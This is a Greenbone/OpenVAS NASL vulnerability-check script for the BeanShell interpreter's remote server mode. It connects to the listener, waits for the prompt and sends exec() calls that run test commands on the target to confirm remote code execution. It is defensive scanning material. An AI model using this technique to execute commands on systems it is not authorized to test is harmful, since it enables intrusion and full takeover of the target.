if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.108445" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2018-06-13 14:51:12 +0200 (Wed, 13 Jun 2018)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "BeanShell Remote Server Mode RCE Vulnerability (Telnet)" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2018 Greenbone Networks GmbH" );
	script_family( "Gain a shell remotely" );
	script_dependencies( "find_service1.sc", "os_detection.sc" );
	script_mandatory_keys( "beanshell_listener/detected" );
	script_xref( name: "URL", value: "http://www.beanshell.org/manual/remotemode.html" );
	script_xref( name: "URL", value: "http://www.beanshell.org/manual/bshcommands.html#exec" );
	script_tag( name: "summary", value: "The BeanShell Interpreter in remote server mode is prone to a
  remote code execution (RCE) vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted request and checks if it is possible to
  execute code on the target host." );
	script_tag( name: "impact", value: "Successful exploitation could allow an attacker to gain complete
  control over the target system." );
	script_tag( name: "affected", value: "BeanShell Interpreter running in remote server mode." );
	script_tag( name: "solution", value: "Restrict access to the listener or disable the remote server
  mode." );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "Mitigation" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("port_service_func.inc.sc");
port = service_get_port( nodefault: TRUE, proto: "beanshell" );
if(!soc = open_sock_tcp( port )){
	exit( 0 );
}
for(;TRUE;){
	i++;
	if(i > 65535){
		close( soc );
		exit( 0 );
	}
	r = recv( socket: soc, length: 1 );
	if(strlen( r ) == 0){
		close( soc );
		exit( 0 );
	}
	buf += r;
	if(egrep( pattern: "^bsh %", string: buf )){
		break;
	}
}
cmds = exploit_commands();
for cmd in keys( cmds ) {
	c = "exec(\"" + cmds[cmd] + "\");\n";
	send( socket: soc, data: c );
	res = recv( socket: soc, length: 4096 );
	if(egrep( pattern: cmd, string: res ) || egrep( pattern: "Windows IP \\?\\?\\?\\?", string: res )){
		security_message( port: port, data: "It was possible to execute the command `" + cmds[cmd] + "` on the remote host.\n\nRequest:\n\n" + chomp( c ) + "\n\nResponse:\n\n" + chomp( res ) );
		close( soc );
		exit( 0 );
	}
}
close( soc );
exit( 99 );

